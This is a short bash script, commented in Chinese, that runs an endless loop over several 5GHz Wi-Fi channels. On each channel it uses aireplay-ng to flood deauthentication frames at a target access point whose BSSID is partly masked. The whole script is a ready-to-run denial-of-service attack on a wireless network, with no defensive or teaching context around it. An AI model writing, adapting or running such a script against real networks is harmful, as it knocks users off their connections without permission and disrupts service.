while true; do
  # 选择5GHz常用信道（可根据需要调整）
  for ch in 36 44 48 149 157 161; do  # 精简版，覆盖主要信道
    sudo iwconfig wlan0 channel $ch
    sudo aireplay-ng --deauth 100 -a 7A:C5:83:E4:xx:xx -x 60 wlan0
    sleep 0.1
  done
done
